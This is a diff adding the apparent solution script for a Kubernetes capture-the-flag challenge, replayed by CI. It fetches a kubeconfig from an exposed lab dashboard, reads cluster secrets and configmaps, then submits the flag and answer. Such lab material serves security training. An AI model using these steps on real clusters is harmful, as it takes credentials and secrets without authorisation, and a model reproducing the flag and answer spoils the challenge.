@@ -1,0 +1,10 @@
+# Side series "Orchestre", mission 1: the shortest path, replayed by CI in every language.
+curl -s https://tableau.ondine.test/
+curl -s https://tableau.ondine.test/kubeconfig > .kube/config
+cat .kube/config
+kubectl get pods
+kubectl get secrets
+kubectl get configmaps
+kubectl describe configmap notes-equipe
+submit FLAG{ondine-tableau-ouvert-3c7a}
+answer whatread
